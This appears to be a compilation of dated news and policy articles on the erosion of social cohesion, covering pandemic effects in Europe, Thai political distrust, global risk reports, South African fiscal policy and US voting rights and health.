The spillover effects of pandemic mitigation efforts on societal health have yet to be fully understood. But the report, Solidarity in Isolation? Social cohesion at a time of physical distance, offers an early assessment of the impact on social cohesion in Europe and North America by looking at two dimensions of intergroup dynamics: social capital (the networks between and among groups that facilitate cooperation) and social infrastructure (the physical places and services that bring people together and thus create the conditions for social bonds).

‘The collective threat posed by COVID-19 has required an unprecedented level of social solidarity in long-polarised and individualised societies’, analysts Natalia Banulescu-Bogdan and Aliyyah Ahad write. ‘But while the pandemic has put everyone in the same storm, they are not necessarily in the same boat’.

Beyond weakened bonds between groups, the report spotlights two other trends:

**The fact that virtual immigrant integration activities are imperfect substitutes for social connection. **Integration programmes have slowly made the leap to the online world, but digital tools often fail to fully recreate the benefits of in-person interaction and further exclude those with limited receiving-country language proficiency, weaker local information networks, less familiarity with technology and limited access to electronic devices or the internet.

**New forms of solidarity in isolation have emerged but may not last. **Bursts of mutual aid and volunteering have offered a crucial lifeline to people in need, but their spontaneity may also be a barrier to long-term sustainability. Patchwork solutions forged in crisis may be better suited to the provision of emergency assistance than to addressing deeper structural needs.

To prevent the further erosion of social capital and infrastructure, the authors recommend building into recovery plans a range of initiatives that strengthen social cohesion. Evidence shows that communities with high levels of social capital and trust weathered the public health crisis better than areas lacking robust support networks. Thus, government action to rebuild links between different segments of society, including through consultative decision-making processes, serves both community interests and wider crisis prevention efforts.

The authors also recommend that policymakers consider the potential for concerns over allocations when making resource decisions. Given the collective impact of the pandemic and lockdown measures, policies that mainstream relief to all vulnerable groups, such as sector-wide assistance programmes or ones based on material conditions, could help ease allocation concerns. It may also be important to demonstrate investment in community ‘commons’, such as parks and libraries, which may have broader appeal.

‘To minimise the potential social damage from this prolonged period of lockdown, it is vital that social cohesion be prioritised during the recovery, both in terms of when and how parts of the social infrastructure are reopened and in how decisions are made and who is consulted’, the authors write. ‘Missing this opportunity could turn this health crisis into a much longer and more profound social one’.

The report is the latest from MPI Europe's Integration Futures Working Group, which brings together policymakers and experts, civil-society officials and private-sector leaders to create a platform for long-term strategic and creative thinking. The Working Group is supported by the Robert Bosch Stiftung.

The first global pandemic in more than 100 years, COVID-19 has spread throughout the world at an unprecedented speed. At the time of writing, 4.5 million cases have been confirmed and more than 300,000 people have died due to the virus. As countries seek to recover, some of the more long-term economic, business, environmental, societal and technological challenges and opportunities are just beginning to become visible. To help all stakeholders – communities, governments, businesses and individuals understand the emerging risks and follow-on effects generated by the impact of the coronavirus pandemic, the World Economic Forum, in collaboration with Marsh and McLennan and Zurich Insurance Group, has launched its COVID-19 Risks Outlook: A Preliminary Mapping and its Implications - a companion for decision-makers, building on the Forum’s annual Global Risks Report. The report reveals that the economic impact of COVID-19 is dominating companies’ risks perceptions. Companies are invited to join the Forum’s work to help manage the identified emerging risks of COVID-19 across industries to shape a better future.

Omicron pushed COVID back to the top

The rise of the Omicron variant has pushed COVID-19 back up to pole position after it dropped to third on the Ipsos list in November. Over a third (35%) say this is their biggest worry; however, this number is still lower than the 50% who shared the same opinion in January 2021.

The countries that are currently most worried about COVID-19 are South Korea (58%), Australia (51%), Malaysia (50%) and Canada (48%). Fifth position is jointly shared by Germany, Great Britain, Japan and Saudi Arabia (46%).

Changing concerns

Russia (53%) is the most concerned about poverty and social inequality, the second highest worry, according to the survey. However, the largest increase in concern is in the Netherlands (plus eight points), while poverty and inequality is the number one worry in Brazil (43%).

Climate change currently ranks 9th out of the 18 issues in the Ipsos survey, with 15% of the 28 countries surveyed saying it is one of the most important challenges facing their country right now.

It reached its highest level of concern (17%) in February 2020, and has been at 15% or 16% for the past six months.

The countries currently most concerned about climate change are Australia (32%), Canada (30%), Germany (28%), Great Britain (28%) and the US (24%).

63% on average say things in their country are moving in the wrong direction. Image: Ipsos Global Advisor

Heading in the right direction?

A staggering 63% of people in the 28 countries surveyed by Ipsos claim their country is on the wrong track. However, this has moved two points since last month in a more positive direction.

For the second month in a row, Peru has the largest proportion (84%) of people who believe their country is heading down the wrong path.

But perhaps channelling some new year optimism, many countries registered a more positive outlook, such as Chile (+15) and the Netherlands (+12), while Mexico, Hungary and Turkey were all up by six points.

The general lack of faith in the future has echoes in the World Economic Forum’s Global Risks Report 2022, where 89% of respondents believed the short-term outlook for the world would be “volatile, fractured or increasingly catastrophic”.",Social Cohesion Erosion,2022-02-14 08:00:00

Overcoming public distrust will be a monumental task, but it is one that needs to be accomplished for the future of Thai social cohesion.","Panarat Anamwathana is a lecturer in economic history at Thammasat University in Bangkok.

Polarization seems to be a mainstay in Thai politics. Social media and misinformation are exacerbating the deterioration of social cohesion and trust.

Thai people's declining trust in each other, government institutions and media are not only detrimental to social capital, but also make combating misinformation more difficult. This is dangerous enough in normal times. During a pandemic, it can be lethal.

The current Thai political conflict has a generational and ideological divide. Many young people have liberal values. To them, the current government, led by Gen. Prayuth Chan-ocha, is the result of a flawed democracy and the country's strict lese-majeste laws are an infringement on free speech. These sentiments exploded in a series of protests in 2020 and early 2021 that unprecedently challenged the Thai establishment, much to the disapproval of the older population. The older generations tend to be more traditional, hold the monarchy in high regard and are more tolerant of the Prayuth government.

This polarization has left behind an atmosphere of deep distrust of information and news sources that are from the other side. Mistrust has been growing for over a decade, since the Yellow and Red Shirt movements. With the rise of Facebook and Twitter, it becomes easier for each faction to deepen biases and negative associations of their opponents. This is not unique to Thailand, as countries like the United States and the United Kingdom also find that online echo chambers tend to expose voters to increasingly extremist content.

The Thai government is not only ineffective at alleviating distrust, but is actively adding fuel to the fire. Within the past year, Twitter and Facebook have removed hundreds of social media accounts with ties to the Thai military. These accounts are believed to be a part of state-funded information operations with the aim of increasing government support and undermining opposition leaders and movements.

With the spread of COVID-19, following a clear set of guidelines is vital to keeping infection rates low. Instead, many Thai people have become skeptical of their government and civic institutions, hindering correct public health practices and increasing vaccine hesitancy.

Polls conducted in May found that up to 64% of Thai respondents are willing to be vaccinated. These numbers are lower than those from Thailand's neighbors: 83% in Vietnam and 66% in the Philippines. Many Thais are of the opinion that the Sinovac and AstraZeneca vaccines procured by the state have ""low efficacy,"" and are willing to wait for uncertain imports of Pfizer or Moderna vaccines. Delays in inoculation will have both economic and public health costs that Thailand cannot afford.

Poor government management is partly at fault. News networks and social media users are quick to blame each other for spreading ""fake news"" when in reality the government itself is responsible for announcing contradictory or confusing information.

For example, last month, Minister of Public Health Anutin Charnvirakul announced that he would allow ""walk-in jabs"" at vaccination centers but backtracked when the prime minister publicly opposed the measures. The lack of transparency surrounding the deliveries of the domestically produced AstraZeneca vaccines has led to panic about vaccine shortages in the middle of Thailand's mass inoculation program.

The more important factor is that political animosity has bled into other spheres of life, including public health. Regardless of qualification, any medical professional that is seen to be ""on the other side"" of the political conflict loses their trust.

The most prominent example of this phenomenon is Dr. Yong Poovorawan, who is an expert in virology and was part of the team that handled the outbreak of H5N1 bird flu in Thailand in 2004. He now helps the government tackle the spread of COVID-19 and often shares information on virus variants and vaccine efficacies on social media.

After pictures of Poovorawan at a PDRC protest surfaced -- the PDRC applauded the coup d'etat by Prayuth in 2014, his advice has come under scrutiny and suspicion by the anti-establishment faction. Similarly, when other medical professionals, such as respiratory disease expert Dr. Nitipat Chiarakul, express valid concerns such as in classifying COVID-19-related deaths and hospital bed allocation, their questions were portrayed as political attacks and quickly dismissed by government supporters.

It is imperative that the government improve its communication with the public to curtail misinformation and regain the trust of its people. In the short run, the state needs to be more transparent and straightforward. Less confusing information from official channels can at least keep some misinformation from widely circulating.

Daily updates on the number of vaccines procured, allocated and administered in each province is an easy first step. To regain public confidence in the long run, the Thai government must cease their information operations that only serve to deepen political divisions, as well as stop charging critics with defamation.

Overcoming public distrust will be a monumental task, but it is one that needs to be accomplished for the future of Thai social cohesion.",Social Cohesion Erosion,2021-06-18 07:00:00

Global governance has an unresolved problem: both our institutions and our leaders are no longer fit for their purpose.

As the Fourth Industrial Revolution and climate change continue to disrupt our current lives, public and corporate governance needs to change, too.

When the COVID-19 pandemic ends, the world will need a new governance model that differs from its predecessors in several fundamental respects. In particular, while finance, economics, and business remain vitally important, they must serve society and nature – not the other way around.

In 2022, the COVID-19 pandemic and the myriad crises it spawned may finally start to recede. But even in that best-case scenario, a tsunami of new challenges – from the failure of climate action to the erosion of social cohesion – is within sight. Addressing them will require leaders to adopt a different governance model.

Global governance has an unresolved problem

When our institutions are well governed, we pay little attention to them. They are simply invisible infrastructure supporting the economy and virtually all aspects of the social order. And “good enough” governance in the second half of the twentieth century enabled income growth and social peace.

Today, however, many people have lost faith in their leaders. Faced with mounting risks and our collective failure to address them, we have started looking for culprits. Some point the finger at inept political leaders, others blame “Davos Man” CEOs, and a desperate, growing minority sees an elite conspiracy behind the current doom and gloom.

The truth is more complicated. At the heart of our failure to foresee and manage global risks – not only climate change and deepening social divisions but also the reemergence of infectious diseases, debt crises, and inadequate technology regulation – lies an unresolved problem of global governance. Our institutions and their leadership are no longer fit for purpose.

Three different models of governance

We tend to view history as a series of big, earthquake-like events. But the degradation of global governance was mostly a case of gradual erosion.

In the Governance 1.0 period immediately after World War II, both public and corporate governance were marked by the rule of the “one man”: the elected or unelected “strong leader” and the “boss.” This type of leadership worked well in a society where the cost of information was high, hierarchical power and management functioned relatively smoothly, and technological and economic advances benefited almost everyone.

The Governance 2.0 model, which emerged at the end of the 1960s, affirmed the primacy of material wealth, and coincided with the rise of the economist Milton Friedman’s “shareholder capitalism” and progressive global financialization. The new managerial class, accountable only to shareholders, reigned supreme and had global reach. And while the 2008 global financial crisis dealt Governance 2.0 a serious blow, its narrow vision continued to prevail until the outbreak of the COVID-19 pandemic.

The brutal social and economic shock inflicted by COVID-19 ushered in Governance 3.0. Crisis management currently dominates decision-making, with leaders focusing on operational thinking and showing a relative disregard for possible unintended consequences. This short-term, trial-and-error approach has led to haphazard management of the pandemic and its socioeconomic fallout.

What would Governance 4.0 look like?

But when the pandemic ends, we will need a new governance model. Governance 4.0 would differ from its predecessors in several fundamental respects.

First, it would replace today’s short-term crisis management with longterm strategic thinking. A focus on current problems such as the pandemic, socioeconomic crises, and people’s mental health must be complemented with action to tackle climate change, reverse biodiversity loss and environmental damage caused by human activity, and address related social challenges such as involuntary migration.

Second, Governance 4.0 must replace the tunnel vision and top down approach that prevailed in the past. We live in a highly complex and interconnected world, not a linear one with few discontinuities. That also means the roles and responsibilities of each stakeholder in society must change. Business can no longer ignore its social and environmental impact, while government can no longer act as if it alone has all the answers.

Third, the current emphasis on a narrow conception of economics and short-term financial interests must cease. Instead, the primacy of society and nature must be at the core of any new governance system – whether for business or government. Finance and business are vitally important. But they must serve society and nature, not the other way around.

Leaders need to become pioneers for a new age of governance

The world has changed, and public and corporate governance must change with it. Today, major structural shifts like the Fourth Industrial Revolution and climate change are disrupting every industry and center of power. Technologies such as blockchain are replacing centralized and hierarchical organizations with decentralized, autonomous entities. And social, economic, and digital inequities are increasing.

For now, many leaders remain stuck in the shareholder capitalism mentality of Governance 2.0, while some societies still favor the strongman leadership and structure of Governance 1.0. And as long as COVID-19 remains a threat, the crisis mentality of Governance 3.0 will continue to dominate boardroom and cabinet discussions.",Social Cohesion Erosion,2022-01-17 08:00:00

With the COVID-19 pandemic entering its third year, the disparate — some call it inequitable — response among nations is causing a divergent economic recovery that makes it difficult to address global challenges.

As highlighted in the 2022 Global Risks Report — prepared by the World Economic Forum (WEF) with the support of Marsh McLennan and other partners — countries, companies and individuals are experiencing the pandemic, economic recovery, geopolitical shifts and environmental risks in vastly different ways. For example, as the report notes, by 2024, the GDP in developing economies (excluding China) is expected to have fallen 5.5% below pre-pandemic growth forecasts; advanced economies are expected to have surpassed those targets by 0.9%.

These divergent trajectories threaten to lead countries to pursue conflicting response strategies in areas including cyber risk, climate transition, and social unrest, which could exacerbate global frictions.

Such risks must be carefully, creatively and holistically managed through cooperative efforts, data-based decision-making, regular communication, adaptive regulation and flexible strategies if there is to be a more sustainable and resilient future for people, businesses and governments.

Pandemic Fallout

While some wealthier nations have rolled out vaccine booster shots, many others — where health systems were overtaxed even before the pandemic — are struggling simply to get a first dose of the vaccine administered to their citizens.

Major economies are increasingly looking to achieve sustainable long-term growth, while others will labor under debt overhangs and investment shortfalls. And all countries and businesses are being forced to manage supply chain bottlenecks, energy price increases, mounting cyber risks in an increasingly digitized world, and other issues. The net result is a highly uncertain time for the global economy.

According to the experts surveyed for the 2022 Global Risks Report, societal risks — including the “erosion of social cohesion” and “livelihood crises” — have worsened more since the start of the pandemic than any other risk. It is seen as a critical short-, medium- and long-term global risk and among the most potentially damaging for the next decade.

Only 16% of respondents to the WEF Global Risks Perception Survey felt positive and optimistic about the outlook for the world, with only 11% believing the global recovery will accelerate. Volatility, they said, is the keyword for the coming three years.

Environmental Threats

Over a 10-year timeframe, the main concerns center on environmental threats, with the top three risks being the failure of climate actions, extreme weather events, and biodiversity loss.

There is a much broader agreement now than there was 10 years ago on the reality and scale of climate-related threats, and some aggressive actions are being taken. But as countries, sectors, and businesses strive to meet the challenges of transitioning to a low-carbon future, many obstacles remain. For example, the global maritime industry aims to decarbonize shipping, but feels inadequately prepared to do so.

And, as seen at COP26 in Glasgow, individual countries and industries are diverging in their responses to climate risks. This will create a number of cascading effects and challenges, including the formation of climate agenda blocs with differing interests, unequal access to or control of key resources and technologies, economic disruptions and rising inequality, particularly in emerging markets.

Cyber and Technology Risks

The pandemic has had an accelerator effect on digitization and technology development and dependence. The potential adverse consequences around technology are seen by survey respondents as a top 10 risk over the next five to 10 years.

While cyberattacks are not new, they have intensified and become more costly, with the past year being no exception. 2021 saw the highest average cost of a data breach in almost two decades, rising from $3.86 million to $4.24 million on an annual basis. Furthermore, cyber insurance pricing in the United States rose by 96% in the third quarter of 2021, marking the most significant increase since 2015 and a 204% increase year-over-year.

As companies rethink their business offerings and the way they work, there is pressure to digitize and automate. This, in turn, opens more avenues of attack for threat actors, with ransomware in particular becoming a signature cyber threat in recent years — to the point that ransomware-as-a-service now exists.

The aging of technology infrastructure and the inadequacy of network protocols at many organizations adds to the threat. The growing frequency and severity of attacks has significant implications that include supply chain and critical infrastructure disruptions, loss of public trust in governments, higher costs, changing and divergent regulatory schemes globally, a slowdown of “smart cities” agendas, and escalating geopolitical conflicts.

At the same time, businesses need to consider the emergence of the metaverse, which will more tightly connect individuals, businesses, and governments through the convergence of digital tools and platforms, including a backbone built on blockchain technology and immersive virtual reality experiences. Discussions about potential regulation, privacy guardrails and cyberattack vulnerabilities are already taking place at government, industry, and societal levels — but the metaverse may come into existence without all of its risks addressed.

Space Exploration Risks

The ever-expanding nature of risk is seen by the discussion of space issues in this year’s Global Risks Report. The increasing number of countries and businesses involved in commercial space exploration — 2021 saw a record number of 145 orbital space launches globally and there could be as many as 100,000 launches over the next decade — highlights the need to improve governance and international risk mitigation.

And while there are opportunities for public and private players to collaborate, reap the rewards, and manage the risk of space activity, cooperation is likely to be difficult given geopolitical and security sensitivities. Increased activity in space could lead to as yet unknown environmental impacts and heighten the danger of debris damaging critical space infrastructure. For example, the proliferation of launches increases the chance of collisions involving space debris, satellites, and other near-Earth infrastructure, which could escalate international tensions.

COVID-19 continues to test risk management strategies in many ways, some foreseen, others never imagined. During the past two years, countries and organizations have seen successes and failures as they adapt their risk strategies to the virus’s shifting course.

Among the many factors that are critical to managing and recovering from the pandemic, two stand out: adaptability and trust. Governments and businesses need to be ready to adapt response strategies based on evolving circumstances. And they must foster trust that their strategies are based on principled, science-based decisions taking a broad stakeholder view — and effectively communicate them.

The Need for Building Resilience

Many have lamented that more strategic planning was not done ahead of time to build resilience against a pandemic. It’s important now to build greater resilience ahead of future crises — not only pandemics and health risks. Doing so will require a concerted, collaborative effort by governments and businesses. It will also mean developing the means to allocate risks more meaningfully, agile regulations that embrace resilience properly, and more effective data-sharing mechanisms.

At the same time, businesses would do well to focus on such areas as reducing the “resilience deficit” exposed by the pandemic. Over time, efficiency has often been rewarded over resilience, growth over sustainability. As shown by the pandemic, being too lean left some companies vulnerable to shocks. Allowing for redundancies — which some may consider inefficient — may enable businesses to adjust and find alternative models in a more timely fashion.

The pandemic has also highlighted the importance of connecting risk to strategy. The companies that have best weathered the pandemic are those that quickly made needed shifts in strategy, strengthened communications with stakeholders and empowered their leaders and employees to make real-time decisions.

The focus on diversity and inclusiveness in organizations is also increasing. Diversity improves the quality of decisions and reduces the risk of groupthink. It helps companies better understand and reflect the markets they serve. And it enables companies to take a holistic view of the emerging risk landscape.

The Global Risks Report is an important resource for organizations as they navigate the ongoing pandemic and its divergent responses while also seeking guideposts for managing future emerging risks. It is not enough to consider the day-to-day risks of doing business — planning to be resilient in the face of the unexpected is critical.",Social Cohesion Erosion,2022-01-11 08:00:00

On one hand, the urgency to spur inclusive economic growth is hastened by the worsening of living standards and dearth of opportunities for ordinary South Africans; on the other, debt management continues to eat away at revenues. Despite signs of austerity creeping in pre-pandemic, the task ahead of the treasury is now a challenging balancing act: to consider how best to navigate and implement harsh trade-offs that can still improve agency and social cohesion for South Africans.

As a result of decades of interlocking structural constraints, South Africans, unsurprisingly, still find themselves trapped in cycles of unemployment, poverty and inequality — an enduring marginalisation that has had serious implications for the country’s critical social capital.

In 2021, the Institute for Justice and Reconciliation (IJR) warned that if political institutions remain unresponsive to economic grievances in the years to come, they risk tipping the balance from democratic protest to instability. In fact, in July 2021, the nation witnessed the extremely high price of economic exclusion. Against a backdrop of unequal development, a run-down fiscus and dwindling economic agency, the indivisible objects of social cohesion and economic marginalisation were laid bare.

The underlying weak position of the fiscus, and its inability to boost the economic agency of South Africans, preceeded the 11 days of civil unrest and chaos in July 2021. The past decade has been witness to an erosion of agency among South Africans whose access to basic economic opportunities has been stifled.

This was emphasised in the November 2021 medium-term budget policy statement by Minister of Finance Enoch Godongwana, who stressed that reform is now a matter of urgency. Importantly, areas earmarked for reform are also conduits for inclusion. Some of the levers expected to expand access to the economy include, but are not limited to, energy supply, affordable internet access, efficiency in logistics and infrastructure development.

Inclusive reform is crucial

At present, there is a pressing need for reform that promotes inclusion as a catalyst for returning economic agency to all South Africans. This basic need is further evidenced by findings from the South African Reconciliation Barometer, a public opinion survey by the IJR, which found that nearly half (45%) of South Africans are dissatisfied with their personal economic power. This helpless admission can be partially explained by the seemingly impossible barriers preventing access to economic opportunities.

The same survey found that, when it comes to accessing critical components of goal attainment, about a third of South Africans feel they do not have the necessary access to financial resources (35%), the correct type of education (30%) and the ability to easily reach places to achieve their goals (29%).

These severe constraints of access not only deny inclusion, but also erode people’s economic agency — a process that, in turn, exposes a population to greater vulnerability to shocks such as economic downturns or the imminent consequences of climate change. This loss of agency has a further consequence: stifled agency creates frustrations that weaken a society’s resilience to withstanding capture by populism and other harmful political forces.

However, easing these burdens through reform and financing is not a simple matter. With

spiralling debt levels, the revenue to finance-spending priorities has to come from somewhere other than borrowing. In the absence of any prospect for robust growth in the short to medium term, the increased burden could, once again, fall on taxpayers, who are simultaneously shouldering rising inflation and interest rates. These forces have depressed household income and are likely to exert downward pressure on government revenues.

Tricky trade-offs

Amid these pressures, it is unsurprising that the prospect of a greater tax burden does not appeal to South Africans. The Afrobarometer, Africa’s most prominent public opinion survey, found that most South Africans feel that ordinary citizens are already paying too much tax (42%) or about the right amount (35%); only a handful say that people are being taxed less than they should be (15%). Another concern for the treasury to contemplate is that almost seven in 10 people (69%) claim to have difficulties in finding out how the government uses tax revenues. Amid dwindling household income, tax increases risk further depleting agency; it will be interesting to see whether the government takes the route of increasing income and consumption tax.

Constrained by the shrinking fiscal space — whose parameters are defined by a lethargic economy, an impoverished society and the relentless assault of debt servicing costs — the trade-offs must instead pinpoint precise leverage points that create pathways to inclusion that can also unleash multiplier effects. One of several such leverage points is transport — the enduring legacy of apartheid spatial planning, conflated with the poor performance of public-transport infrastructure, has barred South Africans from efficiently accessing economic hubs. This also necessitates that decision-makers consider the high costs to society of the extreme levels of centrality in the economy.

The public purse ought to consider reform that makes the economy a more flexible one, centring around community rather than large state enterprises. To this end, capacitating civil society with the correct resources is not only an enabler for localised nodes of development, but also for rebuilding trust and social capital — critical features of a cohesive and resilient society. After all, it is South Africa’s vibrant civil society that has enabled tremendous resilience and solidarity over the years.

Community or localised development interventions offer a low-cost policy option that can be implemented rapidly. At the same time, localised development creates space for experimentation and innovation — two essential underpinnings of development that are otherwise too costly or risky for large scale or centralised programmes to see through to completion.

The trade-offs ahead will be harsh, but it is essential that fiscal policy is underpinned by a long-term vision for building a socially cohesive and peaceful society. Budget cuts and debt-servicing must not come at the price of social cohesion, but rather enable more flexibility such that agency might once again take hold among our society.

As laid out in a Compendium on Civic Engagement and Population Health, measuring what matters means taking a broader view on how to operationalize voting and civic engagement.
Therefore, it is imperative to prioritize research on the relationship between civic engagement and health to understand what drives health inequities.","We the people of the United States have collective memory problems when it comes to voting and civil rights, a forgetfulness that threatens efforts to improve health and equity. With our attention focused on recent events, we fail to see the cyclical forces that erode our democracy. Voting and civic engagement are relevant to achieving health equity, a stated goal of our national health plan, Healthy People 2030. So, what will it mean for health if voting and civil rights are curtailed?

Civil Rights’ Past And Present

To see the erosion of our democracy more fully, it’s worth looking back at where we’ve come from and notable moments in the history of our civil rights. The year 2019 marked the 400th anniversary of West Africans’ arrival to this country as enslaved people. More than 150 years ago, the 15th Amendment extended voting rights to male citizens, regardless of race, color, or previous condition of servitude. And just over a century ago, women won the right to participate in political decision making with the passage of the 19th amendment. However, the 19th amendment did not eliminate state laws that effectively kept Black Americans, including women, from exercising their right to vote through poll taxes, literacy tests, or domestic terrorism in the form of lynching. It wasn’t until the 1965 passage of the Voting Rights Act that these checks were formally put in place.

Each of these are milestones on our journey toward a society with just and fair conditions for everyone to be as civically active and healthy as possible. Yet, the recent path we have traversed and the one ahead of us is perilous and resembles familiar rocky terrain. In 2013, the US Supreme Court’s decision in Shelby County v. Holder effectively rolled back the 1965 Voting Rights Act, determining it was no longer necessary for states with a history of voter suppression of Black communities to clear changes to voting laws with the courts. Since 2010, and particularly as a result of the US Supreme Court decision, 20 states passed laws designed to suppress the vote, including polling place closures, voter ID laws, and proof of citizenship in the lead-up to the 2016 election. In 2021, following the 2020 election, 19 states have enacted 34 new laws that will make it more difficult to vote.

In January 2022, the Senate blocked the proposed John R. Lewis Voting Rights Advancement Act that would have restored necessary protections against discrimination targeting voters of color. The US has seen increased gerrymandering over the past two decades, intentionally selecting individuals and communities out of rights and power they are guaranteed under law. We have also witnessed elected officials falsely claiming that election results are not valid despite irrefutable proof to the contrary, the insurrection and violence of January 6, 2021, and numerous other examples of our democratic rights being threatened.

Health equity theory posits that traumatic societal transitions, such as we have experienced with a global pandemic and heightened civil unrest since 2020, leads to loss of control, stability, and power, which in turn through chronic stress leads to poorer population health, with disadvantaged groups hit the hardest. This theory came to life in Milwaukee, Wisconsin, in April 2020. During the presidential primary, Milwaukee County polling sites were reduced from 182 to just 5 locations, disproportionately affecting Black voters. In the face of the COVID-19 pandemic and vaccines not yet available, residents faced an imminent threat and cruel quandary: Vote in person, and risk their lives; don’t vote and lose the right to shape the future. These are not unfamiliar circumstances for many Black people whose bodies, minds, and spirits have long been expendable. Obstacles to full participation in the democratic process should be in our past. Unfair practices and policies that limit civic engagement have consequences for everyone. Our futures, like our health, are bound up together.

What will the erosion of voting and civic engagement rights mean for equitable opportunities for health among Americans? There is a robust body of literature tying the health of our democracy to the health of people and populations. For example, a review of more than 100 studies found a consistent relationship between voting and health. Furthermore, the Health and Democracy Index shows that states with more inclusive voting policies and greater levels of civic participation are healthier, while states with exclusionary voting laws and lower participation are less healthy. Healthy People 2020 recognized this connection in a report on civic participation as a key issue within the social determinants of health topics. These studies and others suggest that the relationship between voting and health is complex—in some cases bidirectional or even cyclical. For example, communities that encounter barriers to voting or engagement have poorer health, and poorer health can keep people and communities from voting or being engaged. While this body of research is compelling, there is still much to be learned about how voting and health relate and potential causal pathways that tie them together.

We in the health field can take important steps to make the connection between civic engagement and health explicit and a priority issue. For example, voter participation was recommended by the National Academies of Sciences, Engineering, and Medicine (NASEM)—the congressionally chartered, nonprofit organization that advises government on critical science issues—as a priority among 34 proposed Leading Health Indicators for Healthy People 2030, but the recommendation has not be implemented to date. As laid out in a Compendium on Civic Engagement and Population Health, measuring what matters means taking a broader view on how to operationalize voting and civic engagement. Simply focusing on voter turnout, for example, reinforces a dominant individual responsibility narrative and ignores the structural context of barriers constructed to limit participation.

As Daniel Dawes has pointed out, the political determinants of health—or the assertion of power through systems and structures such as laws and policies—are the main drivers of health inequities in the US but also the least understood. Our nation and our field have too long focused largely on the summary of individual actions when variation in civic health is more deeply rooted in policies and laws that support individual agency and collective power. Therefore, it is imperative to prioritize research on the relationship between civic engagement and health to understand what drives health inequities. Just as important is emphasizing measurement of power imbalances and structural and systemic barriers to engagement.

The Health Field’s Role In Civic Engagement

So, what role can the health field play in this to tackle it at individual and societal levels? Nonpartisan initiatives such as Vot-ER—“Vote like our health depends on it”—bring a focus on voting rights and civic engagement into health care settings where patients can register to vote while waiting for care. Clinicians can also act as trusted messengers to underresourced communities, to advocate for voter registration or capture questions on voting rights in electronic health records. Other multisector opportunities include connecting patients to supports such as transportation to polls as absentee ballot laws are increasingly targeted, and legal aid, particularly as laws shift to criminalize voter participation for some. For public health professionals, Healthy Democracy Healthy People is a nonpartisan initiative that supports professionals and policy makers who are working to advance civic participation and public health. Public Health 3.0 calls for leadership and strategic partnerships to advance equity. State and local public health officials can champion systems-level approaches to increasing community voice in decision making, such as Automatic Voter Registration, which leverages governmental cooperation to reduce barriers to civic participation by allowing automatic voter registration through Departments of Motor Vehicles or other state-designated agencies providing public assistance.

It’s time to mobilize the health field. Physicians, community health workers, state and local public health officers, and others must work together to assure fair representation and prevent the erosion of voting rights. Respected bodies such as the NASEM’s Roundtable on Population Health Improvement workshop convened to focus on civic engagement and health, looking at evidence and tools for action in the field that can improve the health of people in our democracy and the health of democracy itself. This convening, and others like it, help to place increased attention to this issue, but increased knowledge is not enough.

We must continue to step outside the comforts of our field “silos” and invest in efforts to translate research for policy and practice. Organizing may be uniquely possible in this moment of crisis. Many state and local health officials have newly formed or strengthened relationships with community leaders in schools, faith-based organizations, and businesses because of the pandemic. We must continue to raise our voices and reposition our influence and the tools we have at our disposal now. As many places in the US have declared racism a public health crisis, the erosion of voting rights must be understood as manifestations of structural and cultural racism and thus, prioritized for action. When democracy is weakened, social cohesion and public health suffer.

The health of members of a democratic society and the health of that democracy are inextricably intertwined. The narrative we lift up and how we mobilize can make a difference for the field’s chance at influencing voting rights and fair representation. As we call to action, we need to consider: Do we invoke doomsday and fear, or do we lead with a vision for a better tomorrow, appealing to our shared humanity while also applying political pressure? Our history of progress on voting rights and civic engagement has shown us that taking a common-humanity approach that draws inclusive circles can prevail over othering that binds people against a common enemy. We can approach the erosion of our democracy in the spirit of Pauli Murray, a scholar and civil rights activist who wrote, “I intend to destroy segregation by positive and embracing methods....When my brothers try to draw a circle to exclude me, I shall draw a larger circle to include them. Where they speak out for the privileges of a puny group, I shall shout for the rights of all mankind.”

This is the weekend roundup of The WorldPost, of which Nathan Gardels is the editor in chief. Sign up for a weekly roundup of thought-provoking ideas and debates ArrowRight Across Western democracies, the social cohesion that once sustained political consensus has severely eroded. A new segregation is emerging as a combined result of the collapse of socializing institutions and the rise of polarizing practices.

Mandatory military or civic service is gone in most liberal societies. Universal public education, in which all classes, races and ethnicities mingled, has been relegated to less well-off communities while those who can afford it receive a private education from preschool to university. Add to this the inequality that is growing with the widening bifurcation of the globalized digital economy into high and low-wage sectors, which translates into neighborhoods further separated by the cost of housing. And add to that the mass migrations in recent years that have brought a larger presence of outsiders into societies once settled in a fixed identity.

At the same time, mainstream media plays to cultural niches in highly competitive markets while the business model of social media companies maximizes virality among the like-minded. This division of the social imagination into silos, where stereotypes replace real experience with others, both fuels and is amplified in the discourse of demagogic politics. These symbiotic forces contribute mightily to the chronic incapacity to reach a politics of consensus.

In The WorldPost this week, we examine the forces that are fraying social cohesion in the West and what might be done to repair it. We also look at the case of Singapore, where attentive public policy has fostered enduring harmony in that ethnically diverse city-state.

One key culprit behind the broken bonds of society, Francis Fukuyama explains in an interview, is the explosion of identity politics. “What we call identity politics grew out of the social movements of the 1960s, around the demands of African Americans, women, gays and lesbians and other marginalized groups for recognition of their dignity and concrete remedies to social disadvantages,” he says. “These demands have evolved over the years to displace socio-economic class as the traditional way that much of the left thinks about inequality. They reflect important grievances, but in some cases, began to take on an exclusive character where people’s ‘lived experiences’ determined who they were. This created obstacles to empathy and communication.”

As Fukuyama sees it, identity politics have now moved to the right in reaction. “There are several factors conspiring to produce the wave of populism that has emerged in Europe and the United States,” he argues. “One has to do with globalization and its highly unequal impact on developed country populations. Outsourcing and technological change have not just impacted working-class incomes but have also led to a broad social decline that is perceived as a loss of status. High levels of immigration have further challenged traditional notions of national identity, providing an opening for populist politicians who have blamed elites for this situation.”

For Fukuyama, anti-elite, peer-driven social media plays a critical role. He writes, “It is very hard to disentangle cause and effect here: Clearly, Americans would be polarized without social media, and yet the decline of trusted integrating institutions has also contributed to polarization.”

As for mending the common bond, Fukuyama proposes “more deliberate approaches to national integration, like a national service. There are very few places where Americans from different social class can interact with one another, as they used to in the days of mass conscription.”

Social scientist Jutta Allmendinger echoes Fukuyama’s concerns. “Given how crucial overlapping social circles are to cultivating solidarity within a nation, it is worrisome that there are fewer and fewer interactions between different social groups occurring in modern society,” she writes from Berlin. In particular, she focuses on the growing poverty and education gap.

“Germany as a whole has become more segregated since the 1980s,” she reports. “In about half of the country’s bigger cities, we now find neighborhoods in which more than 50 percent of children grow up in poverty. This is affecting the makeup of preschools and elementary schools where children from different backgrounds up until the age of 10 would usually mix. Now, these schools turn more and more into insular bubbles with little interaction between rich children, who are rarely of an immigrant background, and less privileged children, some of whom are migrants. Without such interaction, it is difficult to see how children from different backgrounds can develop an understanding of each other.”

